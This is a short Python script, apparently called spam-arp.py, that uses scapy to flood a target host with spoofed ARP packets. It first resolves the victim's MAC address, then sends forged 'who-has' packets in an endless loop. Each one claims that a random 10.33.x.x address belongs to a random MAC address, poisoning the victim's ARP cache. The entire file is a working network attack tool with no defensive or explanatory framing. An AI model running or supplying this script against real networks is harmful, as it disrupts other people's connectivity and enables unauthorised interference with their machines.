import scapy.all as scapy
import random
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(victim_ip, victim_mac, spoofed_ip, custom_mac):
    packet = scapy.ARP(op="who-has", hwdst=victim_mac, pdst=victim_ip, psrc=spoofed_ip, hwsrc=custom_mac)
    scapy.send(packet, verbose=False)

def generate_random_ip():
    return f"10.33.{random.randint(0, 255)}.{random.randint(0, 255)}"

def generate_random_mac():
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])

def main(victim_ip):
    victim_mac = get_mac(victim_ip)
    
    if victim_mac is None:
        print(f"Aucune adresse MAC trouvée pour l'IP {victim_ip}")
        return
    
    try:
        print(f"Sent spoofed to {victim_ip} :")
        while True:
            spoofed_ip = generate_random_ip()
            custom_mac = generate_random_mac()
            spoof(victim_ip, victim_mac, spoofed_ip, custom_mac)
            print(f"IP: {spoofed_ip} with MAC {custom_mac}")
    except KeyboardInterrupt:
        print("\nInterruption du script par l'utilisateur.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 spam-arp.py <destination_ip>")
        sys.exit(1)

    victim_ip = sys.argv[1]

    main(victim_ip)
